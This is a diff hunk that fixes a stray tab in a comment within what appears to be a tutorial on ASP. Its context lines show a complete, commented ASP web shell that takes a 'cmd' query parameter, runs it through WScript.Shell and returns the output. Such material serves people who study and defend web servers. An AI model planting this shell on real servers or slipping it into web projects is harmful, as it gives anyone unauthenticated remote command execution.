@@ -162,7 +162,7 @@ ASP stands for Active Server Pages and is a framework for developing web pages u
 <%
 commandInput = Request.QueryString("cmd") ' Take our command to execute.
 set Shell = CreateObject("WScript.Shell") ' Shell object to execute the command with.
-set CommandExecution = Shell.Exec(commandInput).StdOut ' Execute the command and save the output stream object	.
+set CommandExecution = Shell.Exec(commandInput).StdOut ' Execute the command and save the output stream object.
 outputString = CommandExecution.Readall() ' Read the steam object as a string.
 response.write outputString ' Output the string that comes of our command execution.
 %>
